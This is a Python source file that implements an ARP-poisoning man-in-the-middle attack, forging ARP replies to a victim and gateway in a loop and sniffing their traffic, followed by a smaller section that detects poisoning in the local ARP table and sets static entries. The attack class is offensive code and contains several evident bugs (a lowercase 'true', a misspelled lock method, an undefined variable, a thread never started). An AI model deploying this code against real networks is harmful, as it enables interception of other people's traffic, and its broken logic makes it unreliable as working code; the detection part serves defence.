import socket
import struct
import binascii
import threading
import uuid
import monitor.monitor as monitor
import os
import re

#############
# ARP Header
#############
HTYPE = '\x00\x01'
PROTOTYPE = '\x08\x00'
HSIZE = '\x06'
PSIZE = '\x04'
OPCODE = '\x00\x02'
ARP_HEADERS = HTYPE + PROTOTYPE + HSIZE + PSIZE + OPCODE
ARP_PROTOCOL_CODE = '\x08\x06'

MAC = 0
IP = 1


class MitM:
    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket. htons(0x0800))
        self.attacker = (hex(uuid.getnode()), socket.gethostbyname(socket.gethostname()))
        self.victim = None
        self.gateway = None
        self.sniffer = None
        self.run_poison = False
        self.packet_handler = None

    def set_apcket_handler(self, handler):
        self.packet_handler = handler

    def set_targets(self, victim=(), gateway=()):
        self.victim = (binascii.unhexlify(victim[0]), socket.inet_aton(victim[1]))
        self.gateway = (binascii.unhexlify(gateway[0]), socket.inet_aton(gateway[1]))

    def craft_ethernet_packet(self):
        victim_eth = self.victim[0] + self.attacker[0] + ARP_PROTOCOL_CODE
        gateway_eth = self.gateway[0] + self.attacker[0] + ARP_PROTOCOL_CODE

        return victim_eth, gateway_eth

    def craft_forged_ARP(self):
        victim_eth, gateway_eth = self.craft_ethernet_packet()
        victim_ARP = \
            victim_eth + ARP_HEADERS + self.attacker[MAC] + self.gateway[IP] + self.victim[MAC] + self.victim[IP]
        gateway_ARP = \
            gateway_eth + ARP_HEADERS + self.attacker[MAC] + self.victim[IP] + self.gateway[MAC] + self.gateway[IP]

        return victim_ARP, gateway_ARP

    def arp_poison(self):
        victim, gateway = self.craft_forged_ARP()
        self.run_poison = true
        while self.run_poison:
            self.socket.send(victim)
            self.socket.send(gateway)

    def stop_arp_poisoning(self):
        locker = threading.Lock()
        locker.aquire()
        self.run_poison = False
        locker.release()

    def set_monitor(self):
        packets_monitor = monitor.Monitor(self.attacker[IP])
        mac_addresses = [self.attacker[MAC], self.gateway[MAC], self.victim[MAC]]
        ip_addresses = [self.attacker[IP], self.gateway[IP], self.victim[IP]]
        packets_monitor.filters.src_mac.add_list(mac_addresses)
        packets_monitor.filters.target_mac.add_list(mac_addresses)
        packets_monitor.filters.src_ip.add_list(ip_addresses)
        packets_monitor.filters.target_ip.add_list(ip_addresses)
        packet.filters.set_filter_mode(False)

        return packets_monitor

    def attack(self, save_packets=True, packet_handler_func=None):
        self.socket.bind(("eth0",socket.htons(0x0800)))
        thread = threading.Thread(target=self.arp_poison())
        packets_monitor = self.set_monitor()
        packets_monitor.set_packet_handler_func(packet_handler_func)
        packets_monitor.capture_data(save_packets)


##########################
# ARP poisoning detection
##########################
def get_arp_table():
    table = []
    with os.popen('arp -a') as f:
        data = f.read()
    for line in re.findall('([-.0-9]+)\s+([-0-9a-f]{17})\s+(\w+)', data):
        table.append(line)

    return table


def scan_table(arp_table):
    suspects = {}
    for first_counter, record in enumerate(arp_table):
        mac = record[1]
        if mac in suspects:
            continue
        ip_addresses = []
        for second_counter, item in enumerate(arp_table):
            if mac == item[1] and first_counter is not second_counter:
                ip_addresses.append(item[0])

        if len(ip_addresses) > 0:
            ip_addresses.append(record[0])
        suspects[mac] = ip_addresses

    return suspects


def set_static_entry(ip, mac):
    command = "arp -s {} {}".format(ip, mac)
    os.system('cmd /c {}'.format(command))

